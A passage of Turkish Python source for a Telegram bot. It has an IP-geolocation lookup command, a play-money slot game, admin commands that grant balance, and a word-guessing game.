        return f"IP adresi: {ip_adresi}\nÜlke: {country}\nBölge: {region}\nŞehir: {city}\nZIP Kodu: {zip_code}\nISP: {isp}\nEnlem: {latitude}\nBoylam: {longitude}\nZaman Dilimi: {timezone}"
    except Exception as e:
        return f"ip Adresi Hatalı."

@bot.message_handler(commands=['ip'])
def handle_ipadres(message):
    try:
        ip_adresi = message.text.split()[1]
        ip_bilgi = ip_sorgula(ip_adresi)
        bot.reply_to(message, ip_bilgi)
    except Exception as e:
        bot.reply_to(message, f"bir ip Adresi Girmelisin.")

        
@bot.message_handler(commands=['slot'])
def slot_command(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)

    current_time = time.time()
    if user_id in user_last_message_time:
      last_message_time = user_last_message_time[user_id]
    else:
      last_message_time = user_last_message_time[user_id] = current_time
    if current_time - last_message_time < 1: 
        bot.reply_to(message, "5 saniye bekle tekrar dene.")
        return
    user_last_message_time[user_id] = current_time

    if len(message.text.split()) == 1:
        bot.reply_to(message, 'Slot Oyununu Oynayarak Bakiyen kasın Çıkarın\nKullanım: /slot <miktar>')
        return

    if user_id not in user_balances:
        bot.reply_to(message, 'Bota kayıtlı değilsiniz, öncelikle bota /start mesajını atın.')
        return

    try:
        bet_amount = int(message.text.split()[1])
    except (IndexError, ValueError):
        bot.reply_to(message, 'Lütfen geçerli bir bahis miktarı girin. Kullanım: /slot <miktar>')
        return

    if bet_amount <= 0:
        bot.reply_to(message, 'Bahis miktarı sayı olmalı.')
        return

    if user_balances[user_id] < bet_amount:
        bot.reply_to(message, f'Yeterli bakiyeniz yok. Mevcut bakiyeniz: {user_balances[user_id]} TL')
        return

    slot_result = random.choices(["🍒", "🍋", "🍉", "⭐", "💎", "🍊", "🍏", "🔔"], k=3)
    unique_symbols = len(set(slot_result))

    if unique_symbols == 1:  
        winnings = bet_amount * 4
        user_balances[user_id] += winnings - bet_amount  
        bot.reply_to(message, f'3 sembol eşleşti! Kazandınız!\nKazanılan Bakiye: {winnings} TL\nYeni bakiyeniz: {user_balances[user_id]} TL\nSlot sonucu: {" ".join(slot_result)}')
    elif unique_symbols == 2: 
        winnings = bet_amount * 3
        user_balances[user_id] += winnings - bet_amount 
        bot.reply_to(message, f'2 sembol eşleşti Kazandınız!\nKazanılan bakiye: {winnings} TL\nYeni bakiyeniz: {user_balances[user_id]} TL\nSlot sonucu: {" ".join(slot_result)}')
    else:
        user_balances[user_id] -= bet_amount
        bot.reply_to(message, f'Kazanamadınız. Bir dahakine daha şanslı olabilirsiniz.\nSlot sonucu: {" ".join(slot_result)}\nKalan bakiye: {user_balances[user_id]} TL')

    save_balances()
    
@bot.message_handler(commands=['gonder'])
def send_balance(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)

    if user_id not in SUDO_USERS:
        bot.reply_to(message, 'Bu komutu kullanma yetkin yok yarram.', reply_to_message_id=message.message_id)
        return

    if not message.reply_to_message:
        bot.reply_to(message, 'Bu komutu kullanmak için bir mesaja yanıt vermelisiniz.', reply_to_message_id=message.message_id)
        return

    try:
        parts = message.text.split()
        amount = int(parts[1])
        target_id = str(message.reply_to_message.from_user.id)
    except (IndexError, ValueError):
        bot.reply_to(message, 'Lütfen geçerli bir format kullanın. Kullanım: /gonder <miktar>', reply_to_message_id=message.message_id)
        return

    if amount <= 0:
        bot.reply_to(message, 'Gönderilecek miktar pozitif bir sayı olmalıdır.', reply_to_message_id=message.message_id)
        return

    if target_id not in user_balances:
        user_balances[target_id] = 100  

    user_balances[target_id] += amount
    save_balances()

    bot.reply_to(message, f'Başarılı! {target_id} kimlikli kullanıcıya {amount} TL bakiye gönderildi. Yeni bakiye: {user_balances[target_id]} TL', reply_to_message_id=message.message_id)
  
@bot.message_handler(commands=['f'])
def free(message):
    user_id = str(message.from_user.id)
    if user_id not in SUDO_USERS:
        return bot.reply_to(message, "Bu komutu kullanmaya yetkiniz yok.")
    
    try:
        with open('balances.json', "r") as file:
            balances = json.load(file)

        for key, value in balances.items():
            if value == 0:
                user_balances[key] = 25000

        save_balances()
        bot.reply_to(message, "Tüm uygun kullanıcılara 25000 bakiye gönderildi.")
        
    except json.JSONDecodeError:
        bot.reply_to(message, "Bakiye dosyası okunamadı. Lütfen dosya formatını kontrol edin.")
    except Exception as e:
        bot.reply_to(message, f"Bir hata oluştu: {str(e)}")
    
@bot.message_handler(commands=['kelime'])
def start_word_game(message):
    user_id = str(message.from_user.id)
    chat_id = message.chat.id

    if chat_id in word_game_sessions:
        bot.send_message(chat_id, 'Oyun zaten başlatıldı.')
        return

    target_word = random.choice(kelimeler)
    word_game_sessions[chat_id] = {'target_word': target_word.upper()}
    word_game_sessions[chat_id]['revealed_letters'] = ['_' if c.isalpha() else c for c in word_game_sessions[chat_id]['target_word']]
    bot.send_message(chat_id, 'Kelime Oyununa Hoş Geldiniz!\n\n' + ' '.join(word_game_sessions[chat_id]['revealed_letters']))

@bot.message_handler(func=lambda message: True)
def handle_word_guess(message):
    user_id = str(message.from_user.id)
    chat_id = message.chat.id  

    if chat_id not in word_game_sessions:
        return

    if user_id not in user_balances:
        return

    target_word = word_game_sessions[chat_id]['target_word'].upper()
    revealed_letters = word_game_sessions[chat_id]['revealed_letters']

    guess = message.text.upper()

    if len(guess) != 1 and len(guess) != len(target_word):
        bot.reply_to(message, '')
    elif guess == target_word:
        user_balances[user_id] += 1500  # Doğru tahminde 500 TL kazandır
        user_name = message.from_user.first_name
        bot.reply_to(message, f'Tebrikler {user_name}! Doğru kelimeyi buldunuz ve 1500 TL kazandınız.')
        del word_game_sessions[chat_id]
    elif guess in target_word:
        for i, letter in enumerate(target_word):
            if letter == guess:
                revealed_letters[i] = guess
        if '_' not in revealed_letters:
            user_balances[user_id] += 1500
            user_name = message.from_user.first_name
            bot.reply_to(message, f'Tebrikler {user_name}! Doğru kelimeyi buldunuz ve 1500 TL kazandınız.')
            del word_game_sessions[chat_id]
        else:
            bot.reply_to(message, 'Doğru tahmin! Harf ekledim: ' + ' '.join(revealed_letters))
    else:
        bot.reply_to(message, 'Yanlış tahmin! 👎')  
while True:
    
    
    
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"Hata: {e} ")
